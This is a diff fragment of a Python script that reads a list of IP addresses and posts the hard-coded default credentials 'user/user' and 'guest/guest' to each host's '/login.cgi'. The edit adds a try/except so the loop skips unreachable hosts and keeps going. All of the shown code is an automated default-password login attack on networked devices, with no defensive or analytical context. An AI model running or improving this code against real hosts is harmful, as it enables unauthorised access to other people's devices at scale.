@@ -23,10 +23,13 @@ for line in file:
 
     POSTREQ ="http://"+IP+"/login.cgi"
     Data = "username=user&password=user&year=2021&month=1&day=23&hour=0&min=52&sec=43&submit.htm?login.htm=Send"
-    requests.post(POSTREQ, Data, timeout=1)
-    Data = "username=guest&password=guest&year=2021&month=1&day=23&hour=0&min=52&sec=43&submit.htm?login.htm=Send"
-    requests.post(POSTREQ, Data, timeout=1)
-    print("Logging In ! :" , IP,"\n","=======" )
+    Data2 = "username=guest&password=guest&year=2021&month=1&day=23&hour=0&min=52&sec=43&submit.htm?login.htm=Send"
+    try:
+     requests.post(POSTREQ, Data2, timeout=1)
+     requests.post(POSTREQ, Data, timeout=1)
+     print("Logging In ! :" , IP,"\n","=======" )
+    except:
+        continue
 
     # Reading Section
 
